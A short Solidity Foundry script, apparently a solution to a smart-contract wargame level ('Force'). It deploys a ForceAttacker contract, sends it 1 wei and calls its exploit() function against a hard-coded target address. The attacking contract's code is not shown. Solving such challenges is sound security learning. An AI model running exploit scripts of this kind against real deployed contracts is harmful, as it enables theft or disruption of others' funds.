// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "../instances/Ilevel07.sol";
import "../src/level07.sol";

contract Attacker is Script {
    Force level06 = Force(0x982dAC71e5Eba5d02221B0B61e785516B2edBdF1);

    function run() external {
        vm.startBroadcast();

        ForceAttacker attacker = new ForceAttacker();

        (bool sent,) = address(attacker).call{value: 1 wei}("");
        require(sent, "Failed to send Ether");

        attacker.exploit();

        vm.stopBroadcast();
    }
}
